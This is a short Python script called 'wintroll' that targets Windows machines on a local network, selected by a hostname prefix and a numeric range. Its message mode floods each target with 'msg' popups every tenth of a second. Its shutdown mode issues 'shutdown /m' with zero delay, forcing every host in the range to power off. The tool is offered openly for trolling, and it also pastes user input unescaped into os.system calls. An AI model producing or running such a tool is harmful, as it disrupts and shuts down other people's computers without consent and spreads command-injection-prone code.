import os
import threading
import time
import argparse

parser = argparse.ArgumentParser(prog="wintroll", description="Simple trolling utility for Windows local networks", epilog="Made by Christian Fiore")
parser.add_argument("m", help="mode: (m)sg or (s)hutdown")
parser.add_argument("-p", help="prefix: host prefix (ex: SIS-INFO)", required=True)
parser.add_argument("-r", help="host: host range (ex: 1-10) --> [1;10[", required=True)
parser.add_argument("--msg", help="message: message to send", default="Hello World!")
parser.add_argument("-t", help="time: send messages for a certain amount of time (in seconds)", default=5, type=int)
args = parser.parse_args()

def msg(host,message,seconds):
    begin = time.time()
    while time.time() < seconds + begin:
        os.system('msg /SERVER:' + host + ' * ' + message)
        time.sleep(0.1)

def shutdown(host):
    os.system('shutdown /m ' + host + ' /s /t 0')

def host(prefix,i):
    host = prefix+str(i) if i >= 10 else prefix+"0"+str(i)
    return host

if args.m == "m":
    for i in range(int(args.r.split("-")[0]),int(args.r.split("-")[1])):
        threading.Thread(target=msg, args=(host(args.p,i),args.msg,args.t)).start()

if args.m == "s":
    for i in range(int(args.r.split("-")[0]),int(args.r.split("-")[1])):
        shutdown(host(args.p,i))